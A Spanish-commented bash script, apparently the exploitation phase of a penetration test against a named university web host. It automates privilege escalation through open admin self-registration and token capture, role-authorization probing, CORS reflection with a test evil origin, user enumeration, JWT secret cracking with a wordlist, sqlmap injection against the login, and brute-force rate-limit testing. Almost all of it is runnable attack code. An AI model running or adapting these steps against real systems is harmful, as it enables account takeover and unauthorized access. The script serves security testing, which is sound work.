#!/usr/bin/env bash

set -u

# --------------------------- Configuracion -----------------------------------
TARGET_HOST="conjunta3p.espe.edu.ec"
TARGET_URL="http://${TARGET_HOST}"
OUTDIR="explotacion_$(date +%Y%m%d_%H%M%S)"

ADMIN_EMAIL="pentest_admin@test.com"
ALM_EMAIL="pentest_alm@test.com"
PASS="Password123"

# --------------------------- Utilidades --------------------------------------
c_reset="\033[0m"; c_azul="\033[1;34m"; c_verde="\033[1;32m"; c_amar="\033[1;33m"
titulo() { echo -e "\n${c_azul}==== $* ====${c_reset}"; }
ok()     { echo -e "${c_verde}[ok]${c_reset} $*"; }
aviso()  { echo -e "${c_amar}[aviso]${c_reset} $*"; }

registrar() {
  local archivo="$1"; shift
  echo -e "\n\$ $*" | tee -a "${OUTDIR}/${archivo}"
  "$@" 2>&1 | tee -a "${OUTDIR}/${archivo}"
}

requiere() {
  command -v "$1" >/dev/null 2>&1 || { aviso "Falta '$1'; se omite esta seccion."; return 1; }
}

mkdir -p "${OUTDIR}"
titulo "Objetivo: ${TARGET_URL}  |  Resultados en: ${OUTDIR}/"

requiere curl || { aviso "curl es imprescindible."; exit 1; }
requiere jq   || { aviso "jq es imprescindible para extraer el token."; exit 1; }

ADMIN_TOKEN=""

# --------------------------- 1. Escalada por auto-registro -------------------
sec_escalada() {
  titulo "1. Escalada de privilegios por registro abierto"
  # Registro directo como admin
  registrar "01_escalada.txt" curl -s -X POST "${TARGET_URL}/api/auth/register" \
    -H 'Content-Type: application/json' \
    -d "{\"nombre\":\"pentest\",\"email\":\"${ADMIN_EMAIL}\",\"password\":\"${PASS}\",\"rol\":\"admin\"}"
  # Login y captura del token
  ADMIN_TOKEN="$(curl -s -X POST "${TARGET_URL}/api/auth/login" \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"${ADMIN_EMAIL}\",\"password\":\"${PASS}\"}" | jq -r '.token // empty')"
  echo "Token admin: ${ADMIN_TOKEN:0:32}..." | tee -a "${OUTDIR}/01_escalada.txt"
  # Acceso a ruta soloAdmin: si se ontiene 200, la escalada de privilegios esta confirmada
  registrar "01_escalada.txt" curl -s -o /dev/null -w "GET /api/usuarios -> HTTP %{http_code}\n" \
    -H "Authorization: Bearer ${ADMIN_TOKEN}" "${TARGET_URL}/api/usuarios"
  ok "Escalada probada (200 en /api/usuarios confirma admin)."
}

# --------------------------- 2. Autorizacion por rol ------------------
sec_autorizacion() {
  titulo "2. Autorizacion por rol"
  curl -s -X POST "${TARGET_URL}/api/auth/register" -H 'Content-Type: application/json' \
    -d "{\"nombre\":\"alm\",\"email\":\"${ALM_EMAIL}\",\"password\":\"${PASS}\",\"rol\":\"almacenero\"}" >/dev/null
  local alm_token
  alm_token="$(curl -s -X POST "${TARGET_URL}/api/auth/login" -H 'Content-Type: application/json' \
    -d "{\"email\":\"${ALM_EMAIL}\",\"password\":\"${PASS}\"}" | jq -r '.token // empty')"
  # El almacenero debe recibir 403 en rutas soloAdmin
  registrar "02_autorizacion.txt" curl -s -o /dev/null -w "almacenero GET /api/usuarios  -> HTTP %{http_code}\n" \
    -H "Authorization: Bearer ${alm_token}" "${TARGET_URL}/api/usuarios"
  registrar "02_autorizacion.txt" curl -s -o /dev/null -w "almacenero GET /api/auditoria -> HTTP %{http_code}\n" \
    -H "Authorization: Bearer ${alm_token}" "${TARGET_URL}/api/auditoria"
  # Los movimientos son accesibles por rol basico
  registrar "02_autorizacion.txt" curl -s -o /dev/null -w "almacenero GET /api/movimientos -> HTTP %{http_code}\n" \
    -H "Authorization: Bearer ${alm_token}" "${TARGET_URL}/api/movimientos"
  ok "403 en usuarios/auditoria = control de rol efectivo; movimientos son globales."
}

# --------------------------- 3. CORS y enumeracion de usuarios ---------------
sec_cors_enum() {
  titulo "3. CORS abierto y enumeracion de usuarios"
  registrar "03_cors.txt" curl -s -o /dev/null -D - -H 'Origin: https://evil.test' \
    "${TARGET_URL}/api/health"
  # Intento de registro con un email ya existente revela su existencia
  registrar "03_enum.txt" curl -s -X POST "${TARGET_URL}/api/auth/register" \
    -H 'Content-Type: application/json' \
    -d "{\"nombre\":\"x\",\"email\":\"${ADMIN_EMAIL}\",\"password\":\"${PASS}\",\"rol\":\"almacenero\"}"
  ok "ACAO reflejado = CORS abierto; 'email ya registrado' = enumeracion."
}

# --------------------------- 4. Analisis de JWT ------------------------------
sec_jwt() {
  titulo "4. Analisis del token JWT"
  requiere jwt_tool || return
  [ -z "${ADMIN_TOKEN}" ] && { aviso "Sin token; ejecute la seccion 1."; return; }
  registrar "04_jwt.txt" jwt_tool "${ADMIN_TOKEN}"
  registrar "04_jwt.txt" jwt_tool "${ADMIN_TOKEN}" -X a
  registrar "04_jwt.txt" jwt_tool "${ADMIN_TOKEN}" -C -d /usr/share/wordlists/rockyou.txt
  ok "Revise si el secreto de firma es crackeable."
}

# --------------------------- 5. Inyeccion SQL en el login --------------------
sec_sqli() {
  titulo "5. Inyeccion SQL en el login"
  requiere sqlmap || return
  registrar "05_sqli.txt" sqlmap -u "${TARGET_URL}/api/auth/login" \
    --data='{"email":"a@a.com","password":"x"}' \
    --headers="Content-Type: application/json" --batch --level=2 --risk=1
  ok "Esperado: not injectable."
}

# --------------------------- 6. Fuerza bruta / rate limit  ----------
sec_rate_limit() {
  titulo "6. Fuerza bruta y validacion del rate limit"
  for i in $(seq 1 6); do
    code="$(curl -s -o /dev/null -w '%{http_code}' -X POST "${TARGET_URL}/api/auth/login" \
      -H 'Content-Type: application/json' \
      -d "{\"email\":\"${ADMIN_EMAIL}\",\"password\":\"incorrecta\"}")"
    echo "intento ${i} -> HTTP ${code}" | tee -a "${OUTDIR}/06_rate_limit.txt"
  done
  ok "429 confirma el rate limit."
}

# --------------------------- Orquestacion ------------------------------------
sec_escalada
sec_autorizacion
sec_cors_enum
sec_jwt
sec_sqli
sec_rate_limit

titulo "Fase 5 finalizada. los archivos en ${OUTDIR}/"

